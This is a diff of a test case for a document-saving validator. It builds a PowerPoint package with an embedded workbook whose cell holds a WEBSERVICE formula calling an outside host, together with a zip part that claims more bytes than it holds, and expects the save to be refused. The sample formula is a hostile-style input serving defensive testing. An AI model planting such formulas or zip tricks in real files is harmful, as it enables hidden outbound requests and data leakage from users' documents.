+      // A stored part that declares more bytes than it holds does not keep a longer workbook that starts the same.
+      const feed = zipSync({
+        'xl/worksheets/sheet1.xml': strToU8(
+          '<worksheet><sheetData><row r="1"><c r="A1"><f>_xlfn.WEBSERVICE("https://example.com/")</f></c></row></sheetData></worksheet>',
+        ),
+      })
+      const short = claimSize(zipSync({ 'x.bin': feed.slice(0, 10) }, { level: 0 }), feed.length)
+      const withFeed = zipSync({
+        'ppt/slides/slide1.xml': strToU8('<p:sld xmlns:p="urn:p"/>'),
+        'ppt/slides/_rels/slide1.xml.rels': relationships(relationship('package', '../embeddings/Book.xlsx')),
+        'ppt/embeddings/Book.xlsx': feed,
+      })
+      expect(await check('deck.pptx', withFeed, [short])).toStartWith(
+        '"deck.pptx" was not saved: the script added a formula that fetches data from outside the file',
+      )
+    })
   })
 })
